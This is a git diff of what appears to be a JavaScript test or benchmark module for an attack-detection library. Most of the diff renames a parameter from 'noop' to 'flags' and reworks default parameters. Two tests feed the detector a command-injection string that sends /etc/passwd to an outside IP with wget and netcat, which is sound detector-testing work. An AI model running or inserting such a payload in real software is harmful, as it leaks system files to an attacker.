@@ -42,27 +42,26 @@ module.exports = {
   groupSetup(config) {
   },
   tests: {
-    noCheck(params = {}) {
-      return Object.assign(params, {noop: 1});
+    noCheck(params = this.defaultParams()) {
+      return Object.assign(params, {flags: 1});
     },
-    noCheckWithFinding(params = {}) {
-      return Object.assign(params, {noop: 2});
+    noCheckWithFinding(params = this.defaultParams()) {
+      return Object.assign(params, {flags: 2});
     },
-    check(params = {}) {
-      return Object.assign(params, {noop: 0});
+    check(params = this.defaultParams()) {
+      return Object.assign(params, {flags: 0});
     },
-    short(params = {}) {
+    short(params = this.defaultParams()) {
       return Object.assign(params, {input: 'input'});
     },
-    long(params = {}) {
+    long(params = this.defaultParams()) {
       const input = '&wget --post-file /etc/passwd; cat myFile && nc -w 3 123.2.2.2 < /etc/passwd';
       return Object.assign(params, {input});
     },
-    defaultParams(params) {
-      Object.assign(params, { noop: 0, input: 'input' }, params);
+    defaultParams() {
+      return {flags: 0, input: 'input'};
     },
-    nothing(params) {
-      this.defaultParams(params);
+    nothing(params = this.defaultParams()) {
     },
     kitchenSink(params) {
       this.eachRuleType(params);
@@ -70,29 +69,26 @@ module.exports = {
       this.eachInputType(params);
       this.collection(params);
     },
-    stubScoreAtom(params) {
+    stubScoreAtom(params = this.defaultParams()) {
       this.defaultParams(params);
-      lib.napi_costs(rules, params.input, inputType, {}, params.noop);
+      lib.napi_costs(rules, params.input, inputType, {}, params.flags);
     },
-    eachRuleType(params) {
+    eachRuleType(params = this.defaultParams()) {
       this.defaultParams(params);
       for (const rule in constants.RuleType) {
         const rules = constants.RuleType[rule];
-        aLib.scoreAtom(rules, params.input, inputType, {}, params.noop);
+        aLib.scoreAtom(rules, params.input, inputType, {}, params.flags);
       }
     },
-    allRuleTypes(params) {
-      this.defaultParams(params);
-      aLib.scoreAtom(allRules, params.input, inputType, {}, params.noop);
+    allRuleTypes(params = this.defaultParams()) {
+      aLib.scoreAtom(allRules, params.input, inputType, {}, params.flags);
     },
-    eachInputType(params) {
-      this.defaultParams(params);
+    eachInputType(params = this.defaultParams()) {
       for (const type of InputTypes) {
-        aLib.scoreAtom(rules, params.input, constants.InputType[type], {}, params.noop);
+        aLib.scoreAtom(rules, params.input, constants.InputType[type], {}, params.flags);
       }
     },
-    collection(params) {
-      this.defaultParams(params);
+    collection(params = this.defaultParams()) {
       const type = 'ParameterValue';
       const cmdInput = '&wget --post-file /etc/passwd; cat myFile && nc -w 3 123.2.2.2 < /etc/passwd';
       const attacks = [
@@ -108,7 +104,7 @@ module.exports = {
         const inputType = constants.InputType[type];
         const rules = constants.RuleType[rule];
 
-        aLib.scoreAtom(rules, input, inputType, {}, params.noop);
+        aLib.scoreAtom(rules, input, inputType, {}, params.flags);
       }
     },
   },
